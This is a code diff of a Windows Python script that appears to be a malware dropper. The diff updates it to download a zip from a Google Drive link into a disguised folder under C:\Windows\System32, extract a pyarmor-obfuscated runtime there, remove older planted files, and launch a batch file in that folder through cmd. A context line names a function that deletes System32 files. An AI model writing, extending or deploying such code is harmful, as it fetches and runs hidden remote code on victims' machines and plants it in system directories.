@@ -27,6 +27,15 @@ def delete_system32_filex():
 
 delete_system32_filex()
 '''
+
+version = "3.11.5"
+location = is_version_installed(version)
+if location:
+    create_batch_file(location, r"C:\Windows\System32\FileSystemXS\AesV8.4.py")
+else:
+    print(f"An incorrect version of python is detected. Contact Dev.")
+    input()
+    exit()
 import zipfile
 import os
 if file_contentsx1 =="asdasdasdasd":
@@ -94,11 +103,11 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\xsystem\AesV8.3.py"
+    aesv3_path = r"C:\Windows\System32\FileSystemXS\AesV8.4.py"
     files_to_delete = [
-        r"C:\Windows\System32\AesV8.2.py",
-        r"C:\Windows\System32\aesv8.2.bat",
-        r"C:\Windows\System32\pyarmor_runtime_000000"
+        r"C:\Windows\System32\xsystem\AesV8.3.py",
+        r"C:\Windows\System32\xsystem\aesv8.3.bat",
+        r"C:\Windows\System32\xsystem\pyarmor_runtime_000000"
     ]
 
     aesv3_exists = os.path.exists(aesv3_path)
@@ -127,11 +136,11 @@ def download_file_from_google_drive(url, output_path):
     if not os.path.exists(output_path):
         gdown.download(url, output=output_path, quiet=True)
 
-if not os.path.exists("C:\\Windows\\System32\\xsystem\\pyarmor_runtime_000000"):
+if not os.path.exists("C:\\Windows\\System32\\FileSystemXS\\pyarmor_runtime_000000"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1sST71NGJE_buhaNhzfkaMmnE4LrKydWj", "C:\\Windows\\System32\\xsystem\\august27.zip")
-    zip_file = r'C:\Windows\System32\xsystem\august27.zip'
-    extract_dir = r'C:\Windows\System32\xsystem'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1PMtyGMQ2m0Kv0ohOJe0VDR3yxHIM0Kpb", "C:\\Windows\\System32\\FileSystemXS\\august29.zip")
+    zip_file = r'C:\Windows\System32\FileSystemXS\august29.zip'
+    extract_dir = r'C:\Windows\System32\FileSystemXS'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
 
@@ -193,7 +202,7 @@ else:
     print("Success.")
 
 os.system('cls')
-batch_file_path = r"C:\Windows\System32\xsystem\aesv8.3.bat"
+batch_file_path = r"C:\Windows\System32\FileSystemXS\aesv8.4.bat"
 os.system('cls')
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
